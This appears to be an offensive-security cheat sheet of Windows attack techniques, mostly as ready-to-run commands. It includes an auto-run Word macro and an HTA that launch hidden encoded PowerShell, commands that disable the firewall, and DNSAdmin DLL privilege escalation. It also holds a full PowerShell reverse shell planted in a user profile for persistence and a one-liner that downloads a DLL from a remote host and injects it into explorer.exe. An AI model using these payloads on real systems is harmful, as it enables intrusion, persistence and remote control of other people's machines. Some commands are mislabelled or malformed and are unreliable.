# Windows

### CHM

Use a Windows VM, install the required tools from [here](https://www.microsoft.com/en-us/download/details.aspx?id=21138), then get the scricpt [Out-CHM.ps1](https://raw.githubusercontent.com/samratashok/nishang/master/Client/Out-CHM.ps1) and create your payload:

```bash
Out-CHM -Payload C:\Windows\System32\spool\drivers\color\nc.exe -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
```

### Juicy Potato

#### Metasploit \([Details](http://ohpe.it/juicy-potato/)\)

```bash
use windows/local/ms16_075_reflection_juicy`
set SESSION <>
set CLSID <>
```

Common CLSIDs for the exploit are:

* {e60687f7-01a1-40aa-86ac-db1cbf673334}
* {752073A1-23F2-4396-85F0-8FDB879ED0ED}
* {3c6859ce-230b-48a4-be6c-932c0c202048}
* {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
* {8F5DF053-3013-4dd8-B5F4-88214E81C0CF}
* More can be found [here](http://ohpe.it/juicy-potato/CLSID/)

### Word Macro

Simple Word Macro \(View &gt; Macros, at the end "File-&gt;Information-&gt;Check For Issues" to purge personal details\), save as .doc:

```text
Sub DoStuff()
    Dim wsh As Object
    Set wsh = CreateObject("WScript.Shell")
    wsh.Run "<powershell command here>"
    Set wsh = Nothing
End Sub

Sub AutoOpen()
    DoStuff
End Sub
```

Alternativly we can use HTA:

```text
<script language="VBScript">
  Function DoStuff()
    Dim wsh
    Set wsh = CreateObject("Wscript.Shell")
    wsh.run "powershell -Sta -Nop -Window Hidden -EncodedCommand <blah>"
    Set wsh = Nothing
  End Function

  DoStuff
  self.close
</script>
```

### Building and Signing MSIs

Use [wix](http://wixtoolset.org/) to generate msi files from xml or to manipulate existing msi files. A complete example can be seen in the [Ethereal Writeup](https://vulndev.io/ctf/2019/03/09/htb-ethereal.html)

### Windows Firewall

#### List rules

```bash
netsh advfirewall firewall show rule name=all
```

#### Disable Firewall on Windows 7 via cmd

```bash
Reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server"  /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

#### Disable Firewall on Windows 7 via Powershell

```bash
powershell.exe -ExecutionPolicy Bypass -command 'Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" –Value'`
```

#### Disable Firewall on any windows via cmd

```bash
netsh Advfirewall set allprofiles state off
```

### Load DLL from System32

#### Windows  10

* [Diaghub](https://github.com/xct/diaghub)
* [UsoDllLoader](https://github.com/xct/UsoDllLoader)

### RunAs

To run commands with runas, the user has to have logged in at least once.

#### Tools

* [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
* [Find-PSServiceAccounts](https://github.com/PyroTek3/PowerShell-AD-Recon)
* [Powercat](https://github.com/besimorhino/powercat)

### Elevate Privileges by loading a custom DLL as DNSAdmin

```bash
# requires RSAT
dnscmd <dc> /config /serverlevelplugindll \\<ip>\<dll>

# requires RSAT
$dnssettings = Get-DnsServerSetting -ComputerName <dc> -Verbose
$dnssettings.ServerLevelPluginDll = "\\<ip>\<dll>"
Set-DnsServerSetting -InputObject $dnssettings -ComputerName <dc> -Verbose
```

Then restart the service:

```bash
sc.exe stop dns
sc.exe start dns
```

### DNS Enumeration/Exploitation Tools

{% embed url="https://github.com/Kevin-Robertson/Powermad\#dns-functions" %}

### Bypass JEA

#### When in constrained language mode \(or more\):

Read File:

```bash
${C:\file.txt}
```

Write File:

```bash
${C:\file.txt} = 'content'
```

Break out by writing a powershell profile \(executed whenever powershell is started by this user\):

```bash
${C:\users\<user>\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1} = '$client = New-Object System.Net.Sockets.TCPClient("<ip>",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
```

Via Script Blocks:

```bash
& { ls }
```

Custom function:

```bash
PS>function xct { ls };
PS>xct
...
```

These vulnerabilities exist only in Constrained Language Mode, usually with JEA "NoLanguage" is to be used.

### RCE via Cab Files

{% embed url="https://www.thezdi.com/blog/2020/7/8/cve-2020-1300-remote-code-execution-through-microsoft-windows-cab-files" %}

### Reflectivly load DLL into explorer.exe

```text
String cmd = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://<ip>/payload.dll');(New-Object System.Net.WebClient).DownloadString('http://<ip>/Invoke-ReflectivePEInjection.ps1') | IEX; $procid = (Get-Process -Name explorer).Id; Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid";
```

Via [Invoke-ReflectivePEInjection.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1) .

### Dump Sticky Note Contents

* [https://github.com/helich0pper/StickySituation](https://github.com/helich0pper/StickySituation)

### Resources

* [Windows Privilege Escalation by Absolomb](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
* [GreatSCT](https://github.com/GreatSCT/GreatSCT)
* [Various Bypasses](https://github.com/api0cradle/UltimateAppLockerByPassList)
* [Using credentials to pwn windows boxes](https://blog.ropnop.com/using-credentials-to-own-windows-boxes)

